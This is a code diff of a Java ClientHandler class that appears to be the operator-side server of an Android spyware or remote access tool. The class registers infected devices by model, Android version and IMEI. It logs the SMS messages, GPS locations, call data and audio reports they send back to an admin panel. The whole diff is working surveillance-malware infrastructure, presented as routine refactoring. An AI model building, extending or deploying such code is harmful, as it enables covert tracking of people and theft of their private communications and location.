@@ -6,21 +6,23 @@ public class ClientHandler implements Runnable {
     private Socket socket;
     private DataInputStream in;
     private DataOutputStream out;
-    private ServerGUI gui;
+    private AdminPanel adminPanel;
     private String deviceInfo = "Unknown";
     private String imei = "Unknown";
     private String clientIP = "Unknown";
+    private String deviceModel = "Unknown";
+    private String androidVersion = "Unknown";
 
-    public ClientHandler(Socket socket, ServerGUI gui) {
+    public ClientHandler(Socket socket, AdminPanel adminPanel) {
         this.socket = socket;
-        this.gui = gui;
+        this.adminPanel = adminPanel;
         this.clientIP = socket.getInetAddress().getHostAddress();
         
         try {
             this.in = new DataInputStream(socket.getInputStream());
             this.out = new DataOutputStream(socket.getOutputStream());
         } catch (IOException e) {
-            gui.log("Client handler error: " + e.getMessage());
+            adminPanel.log("Client handler error: " + e.getMessage());
         }
     }
 
@@ -33,35 +35,37 @@ public class ClientHandler implements Runnable {
                 String info = message.substring(5);
                 String[] parts = info.split("\\|");
                 if (parts.length >= 4) {
-                    deviceInfo = parts[1] + " (" + parts[2] + ")";
+                    deviceModel = parts[1];
+                    androidVersion = parts[2];
+                    deviceInfo = deviceModel + " (Android " + androidVersion + ")";
                     imei = parts[3];
+                    adminPanel.log("Device registered: " + deviceInfo + " - IMEI: " + imei);
                 }
             }
 
-            // Listen for commands
+            // Listen for responses
             while (true) {
-                String command = in.readUTF();
-                processResponse(command);
+                String response = in.readUTF();
+                processResponse(response);
             }
         } catch (EOFException e) {
-            gui.log("Client disconnected: " + deviceInfo);
-            Server.removeClient(this);
+            adminPanel.log("Client disconnected: " + deviceInfo);
+            AdminServer.removeClient(this);
         } catch (IOException e) {
-            gui.log("Client error: " + e.getMessage());
-            Server.removeClient(this);
+            adminPanel.log("Client error: " + e.getMessage());
+            AdminServer.removeClient(this);
         }
     }
 
     private void processResponse(String response) {
-        // Process responses from client
         if (response.startsWith("SMS:")) {
-            gui.log("[SMS] " + deviceInfo + ": " + response.substring(4));
+            adminPanel.log("[SMS] " + deviceInfo + ": " + response.substring(4));
         } else if (response.startsWith("GPS:")) {
-            gui.log("[GPS] " + deviceInfo + ": " + response.substring(4));
+            adminPanel.log("[GPS] " + deviceInfo + ": " + response.substring(4));
         } else if (response.startsWith("CALL:")) {
-            gui.log("[CALL] " + deviceInfo + ": " + response.substring(5));
+            adminPanel.log("[CALL] " + deviceInfo + ": " + response.substring(5));
         } else if (response.startsWith("AUDIO:")) {
-            gui.log("[AUDIO] " + deviceInfo + ": " + response.substring(6));
+            adminPanel.log("[AUDIO] " + deviceInfo + ": " + response.substring(6));
         }
     }
 
@@ -80,5 +84,13 @@ public class ClientHandler implements Runnable {
     
     public String getClientIP() {
         return clientIP;
+    }
+    
+    public String getDeviceModel() {
+        return deviceModel;
+    }
+    
+    public String getAndroidVersion() {
+        return androidVersion;
     }
 }
